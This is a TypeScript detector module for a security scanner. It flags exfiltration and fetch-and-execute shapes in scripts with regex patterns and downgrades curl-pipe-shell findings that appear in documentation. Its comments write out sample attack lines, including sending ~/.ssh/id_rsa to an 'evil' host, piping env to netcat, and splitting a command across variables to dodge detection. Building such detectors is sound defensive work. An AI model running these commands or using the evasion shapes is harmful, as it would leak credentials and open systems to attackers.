// Outbound-exfil shapes in shell/script content.
//
// `high` confidence reserved for the "fetch → execute" combinators (curl|sh,
// wget|bash, base64-piped-to-shell) — those are the patterns that have no
// legitimate read-time use in a skill. `medium` for raw env-dumping. `low`
// for plain outbound URLs in scripts so a kit member can audit them.

import type { Detector, Finding } from '../../types.js';
import { runPattern, isScriptFile } from '../util.js';
import { isMarkdownFile } from '../../file-classes.js';

const onlyScripts = (_m: RegExpExecArray, file: string) => isScriptFile(file);

const PATTERNS = [
  {
    category: 'exfil' as const,
    detector: 'fetch-pipe-shell',
    confidence: 'high' as const,
    // curl/wget/fetch ... | sh|bash|zsh|/bin/sh — common drive-by installer shape.
    pattern: /\b(?:curl|wget|fetch)\b[^|\n]{0,200}\|\s*(?:\/bin\/)?(?:sh|bash|zsh|ksh)\b/gi,
  },
  {
    category: 'exfil' as const,
    detector: 'base64-pipe-shell',
    confidence: 'high' as const,
    // echo "<base64>" | base64 -d | sh
    pattern: /\bbase64\s+(?:-d|--decode|-D)\b[^|\n]{0,80}\|\s*(?:\/bin\/)?(?:sh|bash|zsh|ksh)\b/gi,
  },
  {
    category: 'exfil' as const,
    detector: 'eval-fetch',
    confidence: 'high' as const,
    // eval "$(curl ...)" — same drive-by shape without an explicit pipe.
    pattern: /\beval\s+["'`]?\$\(\s*(?:curl|wget|fetch)\b/gi,
  },
  {
    category: 'exfil' as const,
    detector: 'hex-pipe-shell',
    confidence: 'high' as const,
    // printf '\x63\x75\x72\x6c…' | sh — hex-encoded command decoded straight
    // into a shell, the sibling of base64-pipe-shell. 4+ \xNN escapes is well
    // past any benign printf.
    pattern: /\bprintf\b[^\n]*(?:\\x[0-9a-fA-F]{2}\s*){4,}[^\n|]*\|\s*(?:\/bin\/)?(?:sh|bash|zsh|ksh)\b/gi,
  },
  {
    category: 'exfil' as const,
    detector: 'assembled-cmd-pipe-shell',
    confidence: 'high' as const,
    // `C="cur"; U="l"; $C$U … | sh` — a command assembled from adjacent shell
    // variables and piped to a shell, string-splitting to dodge fetch-pipe-shell.
    // Two adjacent `$var` refs with no separator is the tell.
    pattern: /\$\{?\w+\}?\$\{?\w+\}?[^\n|]{0,200}\|\s*(?:sudo\s+)?(?:\/bin\/)?(?:sh|bash|zsh|ksh)\b/gi,
  },
  {
    category: 'exfil' as const,
    detector: 'credential-file-upload',
    confidence: 'high' as const,
    // curl/wget uploading a credential FILE (SSH/cloud/token store) to a host.
    // env-dump-post only catches the *environment*; this catches the on-disk
    // secret. Gated to known credential paths so a normal file upload is fine.
    pattern:
      /\b(?:curl|wget)\b[^\n]*(?:--data(?:-binary|-raw|-ascii)?\b|--upload-file\b|-T\b|-F\b|--form\b|-d\b)[^\n]*(?:\.ssh\/|\.aws\/|\.config\/gcloud|\.kube\/|\.gnupg\/|\bid_rsa\b|\bid_ed25519\b|\bcredentials\b|\.netrc\b|\.npmrc\b|\.pem\b|\.env\b)/gi,
  },
  {
    category: 'exfil' as const,
    detector: 'url-command-substitution-exfil',
    confidence: 'high' as const,
    // curl/wget fetching a URL that embeds `$(…)` reading a secret — the classic
    // GET-based exfil (`curl "https://evil/?d=$(cat ~/.ssh/id_rsa|base64)"`).
    // The command substitution must read a credential/env, not a benign
    // `$(date)` cache-buster, so ordinary dynamic URLs do not match.
    pattern:
      /\b(?:curl|wget)\b[^\n]*https?:\/\/[^\n]*\$\([^)\n]*(?:cat\s+[^)\n]*(?:\.ssh|\.aws|\.env\b|id_rsa|credential|secret|\.pem)|base64|printenv|\benv\b)[^)\n]*\)/gi,
  },
  {
    category: 'exfil' as const,
    detector: 'env-dump-post',
    confidence: 'high' as const,
    // A curl/wget/http command line that uploads the environment: it carries
    // BOTH a data-upload flag AND an env dump source, in EITHER order (two
    // lookaheads). Catches `curl -X POST … --data "$(env)"` (env after the flag)
    // as well as `curl --data @/proc/self/environ`. The env source must be a
    // dump shape (`$(env)`, `env |`, `/proc/self/environ`), not a literal like
    // `--data env=prod`, so benign POSTs do not match.
    pattern:
      /\b(?:curl|wget|http(?:ie|s?))\b(?=[^\n]*(?:--data(?:-binary|-raw)?\b|-d\b|--upload-file\b|-T\b|--form\b|-F\b|-X\s+POST))(?=[^\n]*(?:\$\(\s*(?:print)?env\b|\/proc\/self\/environ|\b(?:print)?env\s*\|))[^\n]+/gi,
  },
  {
    category: 'exfil' as const,
    detector: 'env-var-fanout',
    confidence: 'medium' as const,
    // printenv > /tmp/x or env | nc remote 4444
    pattern: /\b(?:printenv|env)\b[^\n]{0,40}(?:\|\s*nc\b|>\s*\/tmp\/)/gi,
  },
  {
    category: 'exfil' as const,
    detector: 'reverse-shell-nc',
    confidence: 'high' as const,
    pattern: /\bnc\b\s+(?:-[a-zA-Z]+\s+)*[^\s|]+\s+\d{2,5}\s+(?:-e|--exec|-c)\s+/gi,
  },
  // (Removed `outbound-url`: a plain http(s) URL in a script is not exfil — it
  // fired on every URL, ~92% of all exfil findings on real skills. "Uses the
  // internet" is already surfaced once by the `network` CAPABILITY, so the
  // per-URL threat chips were pure noise. The fetch→execute and env-harvest
  // shapes below carry the actual exfil signal.)

  // --- environment-variable / credential harvesting --------
  // Code-shape, script-gated. Iterating the full environ or indexing it by a
  // secret-shaped key is the classic harvest primitive. Medium: legitimate
  // config code reads single named vars, so we never auto-block on these.
  {
    category: 'exfil' as const,
    detector: 'env-iterate-all',
    confidence: 'medium' as const,
    // `for k, v in os.environ.items()` / `Object.keys(process.env)` / `os.environ.copy()`
    pattern:
      /\b(?:for\s+\w+\s*,\s*\w+\s+in\s+os\.environ\.items\s*\(\)|Object\.keys\s*\(\s*process\.env\s*\)|os\.environ\s*\.\s*copy\s*\(\))/g,
    accept: onlyScripts,
  },
  {
    category: 'exfil' as const,
    detector: 'env-secret-index',
    confidence: 'medium' as const,
    // os.environ["...SECRET..."] / process.env['...TOKEN...'] / os.environ.get(...KEY...)
    pattern:
      /\b(?:os\.environ(?:\.get)?\s*[[(]\s*['"][^'"]*(?:KEY|SECRET|TOKEN|PASSWORD|CREDENTIAL)[^'"]*['"]|process\.env\s*\[\s*['"][^'"]*(?:KEY|SECRET|TOKEN|PASSWORD)[^'"]*['"])/gi,
    accept: onlyScripts,
  },
  {
    category: 'exfil' as const,
    detector: 'env-grep-secret',
    confidence: 'medium' as const,
    // env | grep -i token   /   printenv WHATEVER_KEY
    pattern:
      /\benv\s*\|\s*grep\s+(?:-i\s+)?(?:key|secret|token|password)\b|\bprintenv\s+\w*(?:KEY|SECRET|TOKEN|PASSWORD)\w*/gi,
    accept: onlyScripts,
  },
  // --- programmatic POST/PUT to an external URL ------------
  {
    category: 'exfil' as const,
    detector: 'http-post-external',
    confidence: 'medium' as const,
    // requests.post("http..."), httpx.put('https...'), fetch('http...', {method:'POST'})
    pattern:
      /\b(?:requests|httpx)\s*\.\s*(?:post|put)\s*\(\s*['"]https?:\/\/|\bfetch\s*\(\s*['"]https?:\/\/[^'"]+['"][^)]*method\s*:\s*['"]POST['"]/gi,
    accept: onlyScripts,
  },
];

// A `curl … | sh` wrapped in a string literal on its own line is a documented
// hint (a help message like `HINT = "install uv with: curl … | sh"`), not an
// executed pipeline — catches the case in a code file where the surrounding
// markdown rule below does not apply.
const QUOTED_INSTALL_RE =
  /["'][^"'\n]*\b(?:curl|wget|fetch)\b[^"'\n]*\|\s*(?:\/bin\/)?(?:sh|bash|zsh|ksh)\b[^"'\n]*["']/;

export const exfilDetector: Detector = (filePath, contents) => {
  const out: Finding[] = [];
  for (const p of PATTERNS) out.push(...runPattern(filePath, contents, p));
  // `curl … | sh` is the universal vendor-CLI install idiom (rustup, uv, ollama,
  // render, hugging-face, …), byte-identical to a drive-by — only the domain
  // differs, which no static check can adjudicate. In DOCUMENTATION (markdown
  // prose, or a quoted string-literal hint in a code file) it is an install
  // instruction the reader chooses to run, so downgrade to MEDIUM: still FLAGS
  // ("fetch and run code", visible), never auto-quarantines a legit tool skill.
  // In an executable script the pipe runs on the agent's behalf — keep it HIGH
  // so a real drive-by (`curl evil | bash` in a `.sh`) still quarantines.
  // ONLY `fetch-pipe-shell` relaxes; reverse shells, env-dump-post, and
  // base64|sh are never legitimate installs and stay HIGH everywhere.
  const markdown = isMarkdownFile(filePath);
  const lines =
    !markdown && out.some((f) => f.why === 'exfil:fetch-pipe-shell') ? contents.split('\n') : [];
  return out.map((f) => {
    if (f.why !== 'exfil:fetch-pipe-shell') return f;
    const documented = markdown || QUOTED_INSTALL_RE.test(lines[f.lineStart - 1] ?? '');
    return documented ? { ...f, confidence: 'medium' as const } : f;
  });
};
